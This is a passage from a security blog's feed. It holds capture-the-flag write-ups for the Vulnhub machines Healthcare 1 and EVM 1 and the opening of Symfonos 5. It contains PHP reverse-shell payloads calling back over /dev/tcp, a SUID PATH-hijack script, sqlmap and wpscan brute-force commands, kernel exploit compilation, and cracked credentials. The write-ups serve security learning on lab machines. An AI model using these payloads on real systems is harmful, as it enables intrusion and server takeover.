    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Exiting...&amp;#34;&lt;/span&gt;)
    sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After running the script, we get the hashes of 2 users.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;pre&gt;&lt;code&gt;admin : 3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical : ab24aed5a7c4ad45615cd7e0da816eea39e4895d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can try crack these hashes using hashcat/john the ripper but using crackstation.net would be quicker.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now we have passwords for both users.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;admin : ackbar
medical : medical
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;shell-as-apache&#34;&gt;Shell as apache&lt;/h1&gt;
&lt;p&gt;With this credentials, let&amp;rsquo;s get back to ftp. Only the credentials for medical user work.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;On ftp we see that we have access to the file system as the medical user, and we can even access
the web server directory.&lt;/p&gt;
&lt;p&gt;Due to the permissions set we can only write to openemr directory. With this, we can upload a php file that will provide
a reverse shell.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Contents of revshell.php:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Making a request to the uploaded file using curl, we get the reverse shell.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After spawning a proper tty shell with python, we can switch to the medical user. In the Documents folder there&amp;rsquo;s a
Passwords.txt but the root creds don&amp;rsquo;t work.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
&lt;p&gt;Checking for usual privesc techniques like suid binaries by using find command we get one unusual binary.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;find / -perm -4000 -ls 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After running healthcheck, it outputs some system information like disks.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;To understand what exactly it&amp;rsquo;s doing, we run strings on this binary. From this we identify ways to abuse this since
it doesn&amp;rsquo;t use absolute paths on the commands it runs, therefore it will use what it finds from our PATH variable.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I&amp;rsquo;ll use ifconfig here with my own code and place it in the /tmp folder and update my PATH variable. When this ifconfig
is executed it will created a copy of the bash binary which has suid permissions.&lt;/p&gt;
&lt;p&gt;Contents of ifconfig:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;cp /bin/bash /tmp/suidbash;chmod u+s /tmp/suidbash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can then run the suidbash binary with -p to preserve the privileges and get root privileges and read the final
root.txt.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-15.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After getting root I found I has skipped over user.txt in almirant&amp;rsquo;s home directory&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-16.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;p&gt;After looking at other writeups, I discovered other possible paths for exploiting this
machine.&lt;/p&gt;
&lt;p&gt;Initial step needed was exploiting the sql injection. Using sqlmap would have been a quicker way
and achieved the same results. I intentionally didn&amp;rsquo;t use sqlmap on my initial exploitation.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#34;&lt;/span&gt; --batch --dump -T users -C username,password
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-25.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using the obtained credentials, we can login to openemr as administrator and we can either upload a php file or
edit existing php files for command execution.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h4 id=&#34;file-upload&#34;&gt;File upload&lt;/h4&gt;
&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-17.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The file upload functionality does not have restrictions, therefore we can upload our php reverse shell and it will
be stored in that images directory.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-18.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can the trigger the reverse shell by visiting the revshell.php in the /openemr/sites/default/images/ directory.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-19.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Reverse shell obtained.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-20.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;h4 id=&#34;edit-existing-php-files&#34;&gt;Edit existing php files&lt;/h4&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Using the same files functionality, we can also perform edits to existing files. In this case we can edit config.php
and add our reverse shell payload. After saving it and refreshing the page, a reverse shell is obtained on netcat
listener.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-24.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Another possible path that would have been taken after initial shell was that, the shadow file in the
/var/backups directory was world readable.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-21.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Therefore we can crack this hash and switch user to almirant.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-22.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Then we get user.txt.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-23.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: EVM 1</title>
      <link>https://blog.ikuamike.io/posts/2021/evm/</link>
      <pubDate>Fri, 05 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/evm/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;2 Nov 2019&lt;/td&gt;
&lt;td&gt;Ic0de&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;This was an easy box, initial foothold was on wordpress. You needed to bruteforce the admin creds
then get a reverse shell via editing a theme file to get the reverse shell. Escalating to root
was straightforward as we found the root password in a txt file. Some kernel exploits could have also
been used for privilege escalation.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.103
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00028s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
53/tcp  open  domain      ISC BIND 9.10.3-P4 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES SASL AUTH-RESP-CODE TOP UIDL PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more post-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS listed IMAP4rev1 have capabilities OK ENABLE Pre-login LITERAL+ SASL-IR IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unknown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| smb-os-discovery:
|   OS: Windows 6.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Samba 4.3.11-Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|   Domain name: &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2021-03-04T15:43:32-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-03-04T20:43:32
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;samba-139445&#34;&gt;Samba (139,445)&lt;/h2&gt;
&lt;p&gt;Running smbmap and smbclient there&amp;rsquo;s not much there.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbmap -R -H 192.168.56.103

smbclient -L &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;192.168.56.103 -N
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From enum4linux-ng we only get a username&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;enum4linux-ng -A -R 192.168.56.103
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
&lt;p&gt;Visiting the ip on the browser there&amp;rsquo;s only the apache default page.&lt;/p&gt;
&lt;p&gt;Running directory bruteforce, we discover wordpress.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Wordpress:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Some of the comments hint towards bruteforcing credentials.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Bruteforcing the login page on wordpress we get the password &lt;code&gt;24992499&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-www-data&#34;&gt;Shell as www-data&lt;/h1&gt;
&lt;p&gt;With admin access we can edit one of the wordpress theme files to get a reverse shell with this php payload.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Loading the following url we get a reverse shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Changing directory to /home there&amp;rsquo;s one user&amp;rsquo;s folder. Looking at all the files in this directory there&amp;rsquo;s a hidden
file with the root user&amp;rsquo;s password.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
&lt;p&gt;Using the password &lt;code&gt;willy26&lt;/code&gt; I switched to the root user.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;p&gt;Privilege escalation could have also been achieved via kernel exploit.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The box is running ubuntu 16.04.3 and kernel version 4.4.0-87. Searching for exploits using searchsploit
we get several hits.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Getting the first local privilege escalation script and transferring the compiled binary to the target, it works.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;searchsploit -m &lt;span style=&#34;color:#ae81ff&#34;&gt;45010&lt;/span&gt;

gcc 45010.c -o pwn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The second one &lt;code&gt;44298&lt;/code&gt; also works.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Symfonos 5</title>
      <link>https://blog.ikuamike.io/posts/2021/symfonos5/</link>
      <pubDate>Wed, 17 Feb 2021 21:54:20 +0300</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/symfonos5/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;2 Mar 2020&lt;/td&gt;
&lt;td&gt;Zayotic&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;In this box, we first perform ldap injection on the web application to bypass the login page. Then we are able to read
local files by abusing a local file inclusion vulnerability with php base64 filter. From one of the php files we get
ldap credentials that we used to authenticate to ldap and dump entries. From the entries we get a base64 encoded
password that we could use to ssh into the machine. For privilege escalation to a root shell we abused sudo permission granted on
dpkg.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.191.132
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.0019s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
80/tcp  open  http     Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;text/html&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;389636-ldap&#34;&gt;389,636 (LDAP)&lt;/h2&gt;
&lt;p&gt;Doing some basic enumeration on ldap without credentials we only get the domain name. We&amp;rsquo;ll probably
get back to it incase we land on some credentials.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;nmap scripts&lt;/strong&gt;:&lt;/p&gt;
